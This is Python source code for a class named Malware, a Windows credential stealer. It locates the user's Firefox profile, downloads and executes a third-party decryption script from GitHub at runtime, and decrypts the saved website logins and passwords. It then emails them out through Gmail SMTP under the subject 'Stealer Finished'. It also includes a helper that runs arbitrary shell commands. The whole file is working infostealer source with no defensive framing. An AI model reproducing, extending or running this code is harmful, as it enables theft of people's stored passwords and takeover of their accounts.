from email.mime.text import MIMEText
import importlib.util
import subprocess
import configparser
import tempfile
import requests
import smtplib
import platform
import ctypes
import sqlite3
import sys
import re
import os

class Malware:
    def __init__(self, mail: str = "", passw: str = ""):
        if not self._is_valid_email(mail):
            raise ValueError("Invalid email address format.")

        self.__email = mail
        self.__passwd = passw

    def _is_valid_email(self, email):
        return re.match(r"[^@]+@[^@]+\.[^@]+", email)

    def _send_email(self, subject, body):
        if self.__email:
            msg = MIMEText(body)
            msg["Subject"] = subject
            msg["From"] = self.__email
            msg["To"] = self.__email

            try:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(self.__email, self.__passwd)
                    server.send_message(msg)
            except Exception as e:
                return

    def download_file(self, url, extension):
        r = requests.get(url)
        tempdir = tempfile.mkdtemp()
        TempFile = tempfile.mktemp(suffix=extension)
        os.chdir(tempdir)

        with open(TempFile, "wb") as f:
            f.write(r.content)

        return TempFile

    def get_file_content(self, file):
        if file.startswith("http"):
            r = requests.get(file)
            return r.content

        else:
            with open(file, "rb") as f:
                return f.read()

    def get_firefox_profiles(self, username):
        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

        if not os.path.exists(path):
            return None

        try:
            profiles = [profile for profile in os.listdir(path) if "release" in profile]

            # Lista donde guardaremos los perfiles que contienen los archivos requeridos
            valid_profiles = []

            for profile in profiles:
                profile_path = os.path.join(path, profile)

                # Comprobar si los archivos 'logis.json' y 'key.db' existen en el perfil
                logis_file = os.path.join(profile_path, 'logins.json')
                key_file = os.path.join(profile_path, 'key4.db')

                if os.path.exists(logis_file) and os.path.exists(key_file):
                    valid_profiles.append(profile)

            return valid_profiles[0] if valid_profiles else None
        except Exception:
                return None

    def get_firefox_passwords(self, profile):
        path = self.download_file(
            "https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py", ".py")
        basepath = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profile_path = os.path.join(basepath, profile)

        # Cargar módulo
        spec = importlib.util.spec_from_file_location("firefox_decrypt", path)
        firefox_decrypt = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(firefox_decrypt)

        # Emular lo que hace `main()`, pero controlando tú el flujo
        try:
            args = firefox_decrypt.parse_sys_args()
            firefox_decrypt.setup_logging(args)

            moz = firefox_decrypt.MozillaInteraction(args.non_fatal_decryption)
            profile_dir = os.path.expanduser(profile_path)
            profile = firefox_decrypt.get_profile(profile_dir, args.interactive, args.choice, args.list)

            moz.load_profile(profile)
            moz.authenticate(args.interactive)

            passwords = moz.decrypt_passwords()

            # En lugar de imprimir, capturamos el output como string (puedes modificar el formato)
            output = ""
            for p in passwords:
                output += f"URL: {p['url']}\nUser: {p['user']}\nPass: {p['password']}\n\n"

            moz.unload_profile()
            return output

        except Exception as e:
            return f"[!] Error: {e}"

        finally:
            if os.path.exists(path):
                os.remove(path)

    def run_command(self, command):
        try:
            out_command = subprocess.check_output(command, shell=True)
            return out_command.decode("cp850").strip() if out_command else None
        except Exception:
            return None

    def start(self):
        username = malware.run_command("whoami").split("\\")[-1]
        if not username:
            sys.exit(1)

        profile = malware.get_firefox_profiles(username)
        if not profile:
            sys.exit(1)

        passwords = malware.get_firefox_passwords(profile)
        self._send_email("Stealer Finished", passwords)


if __name__ == "__main__":
    malware = Malware("test@gmail.com", "aaaa aaaa aaaa aaaa")
    malware.start()